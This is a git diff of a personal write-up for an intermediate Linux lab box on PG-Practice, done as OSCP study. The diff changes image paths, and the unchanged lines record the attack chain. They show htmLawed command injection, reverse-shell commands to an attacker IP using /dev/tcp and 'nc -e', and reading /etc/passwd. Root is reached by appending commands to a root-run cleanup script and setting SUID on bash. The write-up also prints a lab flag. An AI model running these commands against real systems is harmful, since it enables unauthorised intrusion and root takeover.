@@ -1,5 +1,6 @@
 ---
 Date: 2024-11-10
+Course: "[[OSCP]]"
 Platform: PG-Practice
 Category: Linux
 Difficulty: Intermediate
@@ -64,61 +65,61 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 No enumeration conducted
 ## Port 80 - HTTP (Apache)
 - Navigated to `http://192.168.201.190:80` and identified `htmLawed v1.2.5`
-![[Pasted image 20241010160126.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010160126.png]]
 	- `htmLawed v1.2.5` is vulnerable to command injection [CVE-202-35914](https://nvd.nist.gov/vuln/detail/cve-2022-35914)
 - Ran `gobuster dir -u http://192.168.201.190 -w /usr/share/dirb/wordlists/big.txt` to identify any web directories
-![[Pasted image 20241010160311.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010160311.png]]
 - Ran `gobuster dir -u http://192.168.201.190 -w /usr/share/dirb/wordlists/big.txt -x php,html,htm,txt` to identify any files
-![[Pasted image 20241010162339.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010162339.png]]
 
 ---
 # Exploitation
 ## Command Injection
 - Found potential exploit `52023` on [ExploitDB](https://www.exploit-db.com/exploits/52023)
 - Copied exploit and ran `./52023.sh -u http://192.168.201.190 -c id` for no output
-![[Pasted image 20241010162723.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010162723.png]]
 - [Further investigated vulnerability](https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/) and found it might be executed from the target website by changing `hook` in settings to `exec` with `id` to test command execution
-![[Pasted image 20241010163008.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010163008.png]]
 - Processed request and recieved `404 Not Found`
-![[Pasted image 20241010163050.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010163050.png]]
 - Checked `BurpSuite` proxy history and found request was going to `htmLawedTest.php`.
-![[Pasted image 20241010163218.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010163218.png]]
 - Sent request to `repeater` and modified POST request from `/htmLawedTest.php` to `/` then resent request with `id` and hook set to `exec`
-![[Pasted image 20241010163728.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010163728.png]]
 - Ran `nc -nvlp 4444` to setup Netcat listener, then replaced `id` with `/bin/sh -i >& /dev/tcp/192.168.45.215/4444 0>&1` to attempt reverse shell
-![[Pasted image 20241010170213.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010170213.png]]
 - Reattempted with `nc 192.168.45.215 4444 -e /bin/sh` and successfully caught reverse shell for initial access
-![[Pasted image 20241010170324.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010170324.png]]
 ---
 # Lateral Movement to user
 ## Local Enumeration
 - Attempted to use `python3` to upgrade shell but broke reverse shell and had to restart netcat listener
-![[Pasted image 20241010171239.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010171239.png]]
 - Repeated earlier steps to restablish initial access, then checked for python to find it's not installed. Ran `/usr/bin/script -qc /bin/bash /dev/null` instead to achieve full shell, then navigated to home directory of `www-data` user to print `local.txt`
-![[Pasted image 20241010171555.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010171555.png]]
 - Ran `find / -perm -u=s -type f 2>/dev/null -printf "%f\n"` to find binaries with potential SUID bit set
-![[Pasted image 20241010171912.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010171912.png]]
 
 ---
 # Privilege Escalation
 ## Local Enumeration
 - Ran `cat /etc/passwd` to identify any other users
-![[Pasted image 20241010171727.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010171727.png]]
 - Uploaded and ran `suider.sh` to find potential SUID exploits
-![[Pasted image 20241010173058.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010173058.png]]
 - Uploaded and ran `linpeas.sh` to find potential Privilege Escalations
-![[Pasted image 20241010180027.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010180027.png]]
 - Found `cleanup.sh` in `www-data` home directory
-![[Pasted image 20241010175915.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010175915.png]]
 - Ran `cat /var/www/cleanup.sh` to view `cleanup.sh`
-![[Pasted image 20241010180145.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010180145.png]]
 ## Privilege Escalation vector
 - Ran `nc -nvlp 8081` to setup netcat listener on 8081, then ran `echo 'id | nc 192.168.45.215 8081' >> cleanup.sh` to identify `cleanup.sh` is being regularly executed by `root`
-![[Pasted image 20241010182437.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010182437.png]]
 - Ran `echo "chmod +s /bin/bash" >> cleanup.sh` to use `root` to change `/bin/bash` permissions, and ran `bash -p` until `cleanup.sh` was executed by `root` and user switched to `root`
-![[Pasted image 20241010183151.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010183151.png]]
 - Ran `cat /root/proof.txt` to print `proof.txt` flag
-![[Pasted image 20241010183300.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010183300.png]]
 ---
 # Trophy & Loot
 `local.txt` = `e4dc76bd63849b739fd9741f9bda6995`
